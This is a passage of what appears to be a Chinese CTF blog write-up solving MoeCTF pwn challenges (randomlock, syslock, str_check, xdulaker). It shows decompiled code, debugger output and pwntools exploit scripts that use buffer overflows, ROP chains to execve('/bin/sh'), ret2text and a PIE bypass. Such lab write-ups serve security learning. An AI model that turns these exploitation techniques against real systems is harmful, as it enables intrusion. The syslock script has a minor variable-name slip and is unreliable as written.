%d\n&gt;&quot;</span>, i);</span><br><span class="line">    v6 = rand() % <span class="number">10000</span>;</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">    <span class="keyword">if</span> ( v6 != v4 )</span><br><span class="line">      lose();</span><br><span class="line">  &#125;</span><br><span class="line">  win();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">win</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+8h] [rbp-118h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">264</span>]; <span class="comment">// [rsp+10h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;It opened—how did you do that?&quot;</span>);</span><br><span class="line">  stream = fopen(<span class="string">&quot;./flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  fgets(s, <span class="number">100</span>, stream);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span> v3 - __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">lose</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Incorrect password.&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>模仿即可</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> seed;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span>&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-14h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7;</span><br><span class="line">  <span class="comment">//init(argc, argv, envp);</span></span><br><span class="line">  <span class="comment">//initseed();</span></span><br><span class="line">  srand(seed);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;My lock looks strange—can you help me?&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( <span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">10</span>; ++i )&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;password %2d &gt;&quot;</span>, i);</span><br><span class="line">    v6 = rand() % <span class="number">10000</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; %d\n&quot;</span>,v6);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">My lock looks strange—can you <span class="built_in">help</span> me?</span><br><span class="line">password  1 &gt; 9383</span><br><span class="line">password  2 &gt; 886</span><br><span class="line">password  3 &gt; 2777</span><br><span class="line">password  4 &gt; 6915</span><br><span class="line">password  5 &gt; 7793</span><br><span class="line">password  6 &gt; 8335</span><br><span class="line">password  7 &gt; 5386</span><br><span class="line">password  8 &gt; 492</span><br><span class="line">password  9 &gt; 6649</span><br><span class="line">password 10 &gt; 1421</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ubuntu@LAPTOP-RA1SUD0S:~/Moectf/randomlock$ ./pwn</span><br><span class="line">My lock looks strange—can you <span class="built_in">help</span> me?</span><br><span class="line">password 1</span><br><span class="line">&gt;9383</span><br><span class="line">password 2</span><br><span class="line">&gt;886</span><br><span class="line">password 3</span><br><span class="line">&gt;2777</span><br><span class="line">password 4</span><br><span class="line">&gt;6915</span><br><span class="line">password 5</span><br><span class="line">&gt;7793</span><br><span class="line">password 6</span><br><span class="line">&gt;8335</span><br><span class="line">password 7</span><br><span class="line">&gt;5386</span><br><span class="line">password 8</span><br><span class="line">&gt;492</span><br><span class="line">password 9</span><br><span class="line">&gt;6649</span><br><span class="line">password 10</span><br><span class="line">&gt;1421</span><br><span class="line">It opened—how did you <span class="keyword">do</span> that?</span><br><span class="line">hello pwner flag is accessable</span><br></pre></td></tr></table></figure>
<h3 id="syslock">syslock</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;My lock looks strange—can you help me?\n&quot;</span>, <span class="number">0x29u</span>LL);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;choose mode\n&quot;</span>, <span class="number">0xCu</span>LL);</span><br><span class="line">  i = input();</span><br><span class="line">  <span class="keyword">if</span> ( i &gt; <span class="number">4</span> )</span><br><span class="line">    lose();</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Input your password\n&quot;</span>, <span class="number">0x14u</span>LL);</span><br><span class="line">  read(<span class="number">0</span>, (<span class="type">char</span> *)&amp;s + i, <span class="number">0xCu</span>LL);</span><br><span class="line">  <span class="keyword">if</span> ( i != <span class="number">59</span> )</span><br><span class="line">    lose();</span><br><span class="line">  cheat();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">cheat</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Developer Mode.\n&quot;</span>, <span class="number">0x10u</span>LL);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100u</span>LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.bss:0000000000404080 i               dd ?                    ; DATA XREF: main+4E↑w</span><br><span class="line">.bss:0000000000404080                                         ; main+54↑r ...</span><br><span class="line">.bss:0000000000404084                 align 20h</span><br><span class="line">.bss:00000000004040A0                 public s</span><br><span class="line">.bss:00000000004040A0 s               db    ? ;               ; DATA XREF: main+8A↑o</span><br><span class="line">.bss:00000000004040A1                 db    ? ;</span><br><span class="line">.bss:00000000004040A2                 db    ? ;</span><br><span class="line">...</span><br><span class="line">.bss:00000000004040EE                 db    ? ;</span><br><span class="line">.bss:00000000004040EF                 db    ? ;</span><br><span class="line">.bss:00000000004040EF _bss            ends</span><br></pre></td></tr></table></figure>
<p><code>i&lt;=4</code>和<code>i=59</code>不可能同时达到，显然是在<code>read(0, (char *)&amp;s + i, 0xCuLL);</code>这里修改，<code>s</code>与<code>i</code>差0x20，也就是32</p>
<p>没有后门函数，要想用system和/bin/sh，此时只能写在栈上，获得/bin/sh00的地址就有点不现实，要是能写在bss段上就好了</p>
<p>于是我们利用ret2text使函数回到第二次写入bss段的地址，此时<code>i</code>还是0x3b，可以通过检查</p>
<p>于是我们将/bin/sh00写入，</p>
<p>第二次写入时利用gadget将rax改为0x3b，此时syscall就会实现execve</p>
<p>将rsi、rdx设为0，此时syscall就会实现system</p>
<p>在利用gadget将/bin/sh00弹入rdi，这样就可以实现system(“/bin/sh”)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; tele 0x4040db</span><br><span class="line">00:0000│ rsi 0x4040db (s+59) ◂— 0x68732f6e69622f /* <span class="string">&#x27;/bin/sh&#x27;</span> */</span><br><span class="line">01:0008│     0x4040e3 (s+67) ◂— 0xa /* <span class="string">&#x27;\n&#x27;</span> */</span><br><span class="line">02:0010│     0x4040eb (s+75) ◂— 0</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = start()</span><br><span class="line">p.recvuntil(<span class="string">b&quot;choose mode\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;-32&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Input your password\n&quot;</span>)</span><br><span class="line">p.sendline(p64(<span class="number">0x3b</span>))</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Developer Mode.\n&#x27;</span>)</span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>+p64(<span class="number">0x401324</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">pop_rax_ret_addr = <span class="number">0x401244</span>                <span class="comment"># pop rax; ret</span></span><br><span class="line">pop_rdi_rsi_rdx_ret_addr = <span class="number">0x40123C</span>        <span class="comment"># pop rdi; pop rsi; pop rdx; ret</span></span><br><span class="line">syscall = <span class="number">0x401230</span>                         <span class="comment"># syscall 地址</span></span><br><span class="line">bss_addr = <span class="number">0x4040db</span>                        <span class="comment"># bss段地址</span></span><br><span class="line">bin_sh = <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload2 =  <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x48</span></span><br><span class="line">payload2 += p64(pop_rax_ret_addr)</span><br><span class="line">payload2 += p64(<span class="number">0x3b</span>)                      <span class="comment"># rax = 0x3b (execve系统调用号)</span></span><br><span class="line">payload2 += p64(pop_rdi_rsi_rdx_ret_addr)</span><br><span class="line">payload2 += p64(bss_addr)                  <span class="comment"># rdi = 指向/bin/sh的地址</span></span><br><span class="line">payload2 += p64(<span class="number">0</span>)                         <span class="comment"># rsi = NULL</span></span><br><span class="line">payload2 += p64(<span class="number">0</span>)                         <span class="comment"># rdx = NULL</span></span><br><span class="line">payload2 += p64(syscall)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Input your password\n&quot;</span>)</span><br><span class="line">p.sendline(bin_sh)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Developer Mode.\n&#x27;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="str_check">str_check</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> dest[<span class="number">24</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">size_t</span> n; <span class="comment">// [rsp+18h] [rbp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What can u say?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%255s&quot;</span>, str);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;So,what size is it?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%zu&quot;</span>, &amp;n);</span><br><span class="line">  len = <span class="built_in">strlen</span>(str);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)len &gt; <span class="number">0x18</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Oh,too much.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(str, <span class="string">&quot;meow&quot;</span>, <span class="number">4uLL</span>) )</span><br><span class="line">    <span class="built_in">memcpy</span>(dest, str, n);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">strncpy</span>(dest, str, n);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You&#x27;re right.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000401236 ; int backdoor()</span><br><span class="line">.text:0000000000401236                 public backdoor</span><br><span class="line">.text:0000000000401236 backdoor        proc near</span><br><span class="line">.text:0000000000401236 ; __unwind &#123;</span><br><span class="line">.text:0000000000401236                 endbr64</span><br><span class="line">.text:000000000040123A                 push    rbp</span><br><span class="line">.text:000000000040123B                 mov     rbp, rsp</span><br><span class="line">.text:000000000040123E                 lea     rax, command    ; &quot;/bin/sh&quot;</span><br><span class="line">.text:0000000000401245                 mov     rdi, rax        ; command</span><br><span class="line">.text:0000000000401248                 call    _system</span><br><span class="line">.text:000000000040124D                 nop</span><br><span class="line">.text:000000000040124E                 pop     rbp</span><br><span class="line">.text:000000000040124F                 retn</span><br><span class="line">.text:000000000040124F ; &#125; // starts at 401236</span><br><span class="line">.text:000000000040124F backdoor        endp</span><br></pre></td></tr></table></figure>
<h6 id="strcpydest-src">1. <code>strcpy(dest, src)</code></h6>
<ul>
<li><strong>功能</strong>：将源字符串<code>src</code>复制到目标缓冲区<code>dest</code>，包括<code>'\0'</code>。</li>
<li><strong><code>'\0'</code>处理</strong>：
<ul>
<li>会自动复制源字符串末尾的<code>'\0'</code>到<code>dest</code>中。</li>
<li><strong>风险</strong>：不检查<code>dest</code>的容量，如果<code>src</code>长度超过<code>dest</code>可容纳的空间，会导致缓冲区溢出（<code>'\0'</code>也可能越界写入）。</li>
</ul></li>
</ul>
<h6 id="strncpydest-src-n">2. <code>strncpy(dest, src, n)</code></h6>
<ul>
<li><p><strong>功能</strong>：最多复制<code>n</code>个字节从<code>src</code>到<code>dest</code>。</p></li>
<li><p><strong><code>'\0'</code>处理</strong>：</p>
<ul>
<li>如果<code>src</code>的长度小于<code>n</code>：会复制<code>src</code>的全部内容（包括<code>'\0'</code>），并在剩余空间填充<code>'\0'</code>直到总长度为<code>n</code>。</li>
<li>如果<code>src</code>的长度大于等于<code>n</code>：只复制前<code>n</code>个字节，<strong>不会添加<code>'\0'</code></strong>，此时<code>dest</code>可能不是一个有效的字符串（缺少结束标志）。</li>
</ul></li>
<li><p><strong>注意</strong>：使用后需手动确保<code>dest</code>以<code>'\0'</code>结尾，例如</p>
<p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">strncpy</span>(dest, src, n);</span><br><span class="line">dest[n<span class="number">-1</span>] = <span class="string">&#x27;\0&#x27;</span>;  <span class="comment">// 强制添加结束符（避免溢出）</span></span><br></pre></td></tr></table></figure></p></li>
</ul>
<h6 id="strcatdest-src">3. <code>strcat(dest, src)</code></h6>
<ul>
<li><strong>功能</strong>：将<code>src</code>追加到<code>dest</code>末尾（覆盖<code>dest</code>原有的<code>'\0'</code>）。</li>
<li><strong><code>'\0'</code>处理</strong>：
<ul>
<li>首先找到<code>dest</code>中已有的<code>'\0'</code>，从该位置开始复制<code>src</code>的内容（包括<code>src</code>的<code>'\0'</code>）。</li>
<li><strong>风险</strong>：不检查<code>dest</code>的剩余空间，若<code>dest</code>容量不足，会导致缓冲区溢出。</li>
</ul></li>
</ul>
<h6 id="strncatdest-src-n">4. <code>strncat(dest, src, n)</code></h6>
<ul>
<li><strong>功能</strong>：最多将<code>src</code>的前<code>n</code>个字符追加到<code>dest</code>末尾。</li>
<li><strong><code>'\0'</code>处理</strong>：
<ul>
<li>无论是否复制了<code>n</code>个字符，<strong>最终都会在<code>dest</code>末尾添加一个<code>'\0'</code></strong>。</li>
<li>若<code>src</code>长度小于<code>n</code>，则复制全部<code>src</code>内容（包括其<code>'\0'</code>）后，不再额外添加<code>'\0'</code>（避免重复）。</li>
</ul></li>
<li><strong>安全性</strong>：比<code>strcat</code>更安全，因为限制了追加长度，且确保<code>dest</code>以<code>'\0'</code>结尾。</li>
</ul>
<h6 id="memcpydest-src-n">5. <code>memcpy(dest, src, n)</code></h6>
<ul>
<li><strong>功能</strong>：从<code>src</code>复制<code>n</code>个字节到<code>dest</code>（对所有数据类型通用，不仅限于字符串）。</li>
<li><strong><code>'\0'</code>处理</strong>：
<ul>
<li>完全不处理<code>'\0'</code>：<code>'\0'</code>仅被视为普通字节，若<code>src</code>中包含<code>'\0'</code>且在<code>n</code>范围内，会被正常复制。</li>
<li>不会自动添加<code>'\0'</code>：即使<code>src</code>是字符串，复制后<code>dest</code>也可能缺少结束标志（除非<code>n</code>包含<code>src</code>的<code>'\0'</code>）。</li>
</ul></li>
<li><strong>风险</strong>：若用于字符串复制且<code>n</code>超过实际长度，可能导致<code>dest</code>无<code>'\0'</code>结束符，后续操作（如<code>printf</code>）会越界访问。</li>
</ul>
<h6 id="strlens">6. <code>strlen(s)</code></h6>
<ul>
<li><strong>功能</strong>：计算字符串<code>s</code>的长度（不包含<code>'\0'</code>）。</li>
<li><strong><code>'\0'</code>处理</strong>：
<ul>
<li>从<code>s</code>的首地址开始计数，直到遇到<code>'\0'</code>停止（<code>'\0'</code>是终止条件）。</li>
<li>若<code>s</code>中没有<code>'\0'</code>，会一直访问到非法内存，导致未定义行为（如程序崩溃）。</li>
</ul></li>
</ul>
<h6 id="strcmps1-s2strncmps1-s2-n">7. <code>strcmp(s1, s2)</code>、<code>strncmp(s1, s2, n)</code></h6>
<ul>
<li><strong>功能</strong>：比较字符串（<code>strcmp</code>比较到<code>'\0'</code>为止，<code>strncmp</code>最多比较<code>n</code>个字符）。</li>
<li><strong><code>'\0'</code>处理</strong>：
<ul>
<li><code>strcmp</code>：当任一字符串遇到<code>'\0'</code>时停止比较。</li>
<li><code>strncmp</code>：若在<code>n</code>个字符内遇到<code>'\0'</code>，会将其视为小于任何非<code>'\0'</code>字符（按 ASCII 值，<code>'\0'</code>为 0）。</li>
</ul></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = start()</span><br><span class="line">p.recvuntil(<span class="string">b&quot;What can u say?\n&quot;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;meow\0&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">19</span>+<span class="string">b&#x27;0&#x27;</span>*<span class="number">16</span>+p64(<span class="number">0x40123e</span>)   <span class="comment">#len=4，执行memcpy</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;So,what size is it?\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="xdulaker">xdulaker</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  menu();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">putchar</span>(<span class="number">62</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;opt);</span><br><span class="line">      <span class="keyword">if</span> ( opt != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      pull();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( opt == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      photo();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( opt != <span class="number">3</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      laker();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;A freshman has walked into the lake.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1.Pull him out&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2.Take a photo of him&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3.Walk into the lake.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Your choice&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pull</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Thanks,I&#x27;ll give you a gift:%p\n&quot;</span>, &amp;opt);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">photo</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">80</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Hey,what&#x27;s your name?!&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x40u</span>LL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;I will teach you a lesson.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">laker</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE s1[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">memcmp</span>(s1, <span class="string">&quot;xdulaker&quot;</span>, <span class="number">8uLL</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You are not him.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;welcome,xdulaker&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, s1, <span class="number">0x100u</span>LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>先选一接收opt_addr，再选2写入能使选3能成功执行的payload，最后选三实现ret2text</p>
<p>注意到<code>// [rsp+0h] [rbp-50h] BYREF</code>和<code>// [rsp+0h] [rbp-30h] BYREF</code>，中间插入0x20个字符就可以了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">00:0000│ rsi rsp 0x7ffe4160bea0 ◂— 0x6161616161616161 (<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">... ↓            3 skipped</span><br><span class="line">04:0020│-030     0x7ffe4160bec0 ◂— 0x72656b616c756478 (<span class="string">&#x27;xdulaker&#x27;</span>)</span><br><span class="line">05:0028│-028     0x7ffe4160bec8 —▸ 0x7ffe4160bef0 —▸ 0x7ffe4160bf00 ◂— 1</span><br><span class="line">06:0030│-020     0x7ffe4160bed0 —▸ 0x7ffe4160c018 —▸ 0x7ffe4160c9e8 ◂— <span class="string">&#x27;/home/ubuntu/Moectf/xdulaker/pwn_patched&#x27;</span></span><br><span class="line">07:0038│-018     0x7ffe4160bed8 ◂— 0</span><br><span class="line">08:0040│-010     0x7ffe4160bee0 —▸ 0x7ffe4160bf00 ◂— 1</span><br><span class="line">09:0048│-008     0x7ffe4160bee8 —▸ 0x7ffe4160c018 —▸ 0x7ffe4160c9e8 ◂— <span class="string">&#x27;/home/ubuntu/Moectf/xdulaker/pwn_patched&#x27;</span></span><br><span class="line">0a:0050│ rbp     0x7ffe4160bef0 —▸ 0x7ffe4160bf00 ◂— 1</span><br><span class="line">0b:0058│+008     0x7ffe4160bef8 —▸ 0x61d51ba5c448 (main+112) ◂— jmp main+28</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">00:0000│ rax rdi rsp 0x7ffe4160bec0 ◂— 0x72656b616c756478 (<span class="string">&#x27;xdulaker&#x27;</span>)</span><br><span class="line">01:0008│-028         0x7ffe4160bec8 —▸ 0x7ffe4160bef0 —▸ 0x7ffe4160bf00 ◂— 1</span><br><span class="line">02:0010│-020         0x7ffe4160bed0 —▸ 0x7ffe4160c018 —▸ 0x7ffe4160c9e8 ◂— <span class="string">&#x27;/home/ubuntu/Moectf/xdulaker/pwn_patched&#x27;</span></span><br><span class="line">03:0018│-018         0x7ffe4160bed8 ◂— 0</span><br><span class="line">04:0020│-010         0x7ffe4160bee0 —▸ 0x7ffe4160bf00 ◂— 1</span><br><span class="line">05:0028│-008         0x7ffe4160bee8 —▸ 0x7ffe4160c018 —▸ 0x7ffe4160c9e8 ◂— <span class="string">&#x27;/home/ubuntu/Moectf/xdulaker/pwn_patched&#x27;</span></span><br><span class="line">06:0030│ rbp         0x7ffe4160bef0 —▸ 0x7ffe4160bf00 ◂— 1</span><br><span class="line">07:0038│+008         0x7ffe4160bef8 —▸ 0x61d51ba5c45f (main+135) ◂— jmp main+28</span><br></pre></td></tr></table></figure>
<p>利用固定偏移找到backdoor真实地址，就可以实现PIE绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.data:0000000000004010                 public opt</span><br><span class="line">.data:0000000000004010 opt             dd 5                    ; DATA XREF: pull+8↑o</span><br><span class="line">.data:0000000000004010                                         ; main+26↑o ...</span><br><span class="line">.data:0000000000004010 _data           ends</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000001249                 public backdoor</span><br><span class="line">.text:0000000000001249 backdoor        proc near</span><br><span class="line">.text:0000000000001249 ; __unwind &#123;</span><br><span class="line">.text:0000000000001249                 endbr64</span><br><span class="line">.text:000000000000124D                 push    rbp</span><br><span class="line">.text:000000000000124E                 mov     rbp, rsp</span><br><span class="line">.text:0000000000001251                 lea     rax, command    ; &quot;/bin/sh&quot;</span><br><span class="line">.text:0000000000001258                 mov     rdi, rax        ; command</span><br><span class="line">.text:000000000000125B                 call    _system</span><br><span class="line">.text:0000000000001260                 nop</span><br><span class="line">.text:0000000000001261                 pop     rbp</span><br><span class="line">.text:0000000000001262                 retn</span><br><span class="line">.text:0000000000001262 ; &#125; // starts at 1249</span><br><span class="line">.text:0000000000001262 backdoor        endp</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = start()</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Thanks,I&#x27;ll give you a gift:&quot;</span>)</span><br><span class="line">opt_bytes=p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">opt_addr_str = opt_bytes.strip().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">opt_addr = <span class="built_in">int</span>(opt_addr_str, <span class="number">16</span>)</span><br><span class="line">log.success(<span class="built_in">hex</span>(opt_addr))</span><br><span class="line">data_base=opt_addr-<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Hey,what&#x27;s your name?!\n&quot;</span>)</span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+<span class="string">b&#x27;xdulaker&#x27;</span></span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">backdoor_addr=<span class="number">0x1251</span>+data_base-<span class="number">0x4000</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(backdoor_addr))</span><br><span class="line">payload2=<span class="string">b&#x27;A&#x27;</span>*<span 